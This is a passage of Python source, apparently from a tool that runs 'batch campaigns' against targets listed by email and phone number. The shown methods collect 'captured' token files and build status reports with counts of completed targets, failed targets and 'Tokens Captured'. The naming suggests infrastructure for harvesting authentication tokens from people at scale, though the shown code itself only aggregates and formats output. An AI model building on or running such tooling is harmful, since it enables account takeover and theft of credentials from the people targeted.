                            'captured_at': os.path.getmtime(token_file)
                        })
                except Exception as e:
                    logger.error(f"Error parsing token file {token_file}: {str(e)}")
        except Exception as e:
            logger.error(f"Error finding batch campaign tokens: {str(e)}")
        
        return tokens

    def _get_batch_campaign_output(self, campaign: Dict[str, Any]) -> str:
        """Get aggregated output from all processes in a batch campaign."""
        output = ""
        
        if not campaign.get('processes'):
            return "Batch campaign output not available"
        
        try:
            output += f"=== BATCH CAMPAIGN: {campaign.get('name', 'Unknown')} ===\n"
            output += f"Total Targets: {campaign.get('target_count', 0)}\n"
            output += f"Completed: {campaign.get('completed_targets', 0)}\n"
            output += f"Failed: {campaign.get('failed_targets', 0)}\n"
            output += f"Tokens Captured: {campaign.get('tokens_captured', 0)}\n"
            output += "=" * 50 + "\n\n"
            
            # Add output from individual processes
            for i, proc_info in enumerate(campaign['processes'], 1):
                target = proc_info.get('target', {})
                process = proc_info.get('process')
                status = proc_info.get('status', 'unknown')
                
                output += f"--- Target {i}: {target.get('email', 'Unknown')} ({target.get('phone', 'Unknown')}) ---\n"
                output += f"Status: {status}\n"
                
                if process:
                    try:
                        if process.poll() is None:  # Still running
                            output += "Process still running...\n"
                        else:
                            # Process finished, get output
                            stdout_data, stderr_data = process.communicate()
                            if stdout_data:
                                output += "Output:\n" + stdout_data.decode() + "\n"
                            if stderr_data:
                                stderr_text = stderr_data.decode()
                                # Filter out help text
                                if not ('usage:' in stderr_text or 'the following arguments are required' in stderr_text):
                                    output += "Errors:\n" + stderr_text + "\n"
                    except Exception as e:
                        output += f"Error reading process output: {str(e)}\n"
                
                output += "\n"
                
        except Exception as e:
            output += f"Error generating batch campaign output: {str(e)}\n"
        
        return output